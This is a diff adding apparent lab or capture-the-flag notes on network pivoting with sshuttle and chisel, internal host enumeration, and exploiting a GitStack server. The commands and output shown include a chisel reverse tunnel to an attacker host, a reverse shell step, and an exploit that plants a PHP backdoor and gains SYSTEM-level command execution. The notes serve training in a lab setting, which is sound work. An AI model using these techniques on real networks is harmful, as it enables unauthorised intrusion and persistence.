@@ -367,3 +367,113 @@ attacker:
 ```
 
 *Note: use the jobs command to see a list of backgrounded jobs
+
+# Task 15 - Pivoting - sshuttle
+sshuttle uses an SSH connection to create a tunnelled proxy, it simulates a VPN allowing us to route traffic through the proxy without proxychains
+
+Install
+* sudo apt install sshuttle
+
+Connecting to a sshuttle server
+* sshuttle -r user@host subnet
+  * uses CIDR notation
+* You can also use -N instead of subnet for automatically determining traffic
+
+Key-based authentication
+* sshuttle doesn't support key-based authentication but you can bypass it using --ssh-cmd
+* sshuttle -r user@address --ssh-cmd "ssh -i [keyfile]" subnet
+
+Broken pipe error, server died
+* When connecting to a target that is also in the same subnet range as that you wish to route, exclude it to avoid this problem with -x address
+
+# Task 16 - Pivoting - Conclusion
+There are many different ways to pivot, further research is required for most targets
+
+Summary of tools
+* proxychains
+* foxyproxy
+* ssh
+* plink
+* socat
+* chisel
+* sshuttle
+
+# Task 17 - git server enumeration
+Remote enumeration steps
+* Use prior task CVE to gain a remote shell
+* Use provided shell command to create a reverse shell
+* Upload static nmap binary to /tmp folder
+* Scan remote network 10.200.98.0/24 with nmap to determine hosts that are alive (-sn)
+* Pick in scope hosts
+* Scan each host that is in scope and grab listening ports
+
+# Task 18 - git server pivoting
+Pivoting steps
+* Download static chisel binary from https://github.com/jpillora/chisel/releases/tag/v1.7.6
+* Transfer binary to host using prior shell
+* Attacker
+```
+./chisel-[username] server -p 32000 --reverse &                                                      
+[1] 4495                                                                                         
+2021/03/27 18:45:01 server: Reverse tunnelling enabled  
+2021/03/27 18:45:01 server: Fingerprint
+2021/03/27 18:45:01 server: Listening on http://0.0.0.0:32000        
+```
+* Target
+```
+./chisel-[username] client 10.50.99.2:32000 R:32080:10.200.98.150:80 &                      
+< client 10.50.99.2:32000 R:32080:10.200.98.150:80 &                                    
+[1] 4584                                                                                
+[root@prod-serv tmp]# 2021/03/27 22:45:08 client: Connecting to ws://10.50.99.2:32000   
+2021/03/27 22:45:09 client: Connected (Latency 137.07726ms)                             
+```
+* Attacker
+```
+2021/03/27 18:45:08 server: session#1: tun: proxy#R:32080=>10.200.98.150:80: Listening  
+                                                                                        
+curl http://127.0.0.1:32080                    
+                                                                                        
+<!DOCTYPE html>                                                                         
+<html lang="en">                                                                        
+<head>                                                                                  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">                   
+  <title>Page not found at /</title>                 
+```
+* Use searchsploit to look for exploits on the web service you found
+
+# Task 19 - git server code review
+Code review steps
+* Use searchsploit to look for exploits
+* Copy the exploit code
+  ```
+  searchsploit gitstack | yank-cli
+  searchsploit -m php/webapps/[exploit].py
+  Copied to: [exploit].py
+  ```
+* Remove line endings
+  ```
+  dos2unix [exploit].py 
+  dos2unix: converting file [exploit].py to Unix format...
+  ```
+* Modify exploit
+  * modify the exploit to point to localhost:32080 (port chosen for chisel)
+  * modify \exploit.php to point to \exploit-username.php at the end of the file in two places
+
+# Task 20 - git server exploitation
+Run exploit
+* Run the modified exploit
+  ```
+  .[exploit].py 
+  [+] Get user list
+  [+] Found user twreath
+  [+] Web repository already enabled
+  [+] Get repositories list
+  [+] Found repository Website
+  [+] Add user to repository
+  [+] Disable access for anyone
+  [+] Create backdoor in PHP
+  Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
+  [+] Execute command
+  "nt authority\system
+  " 
+  ```
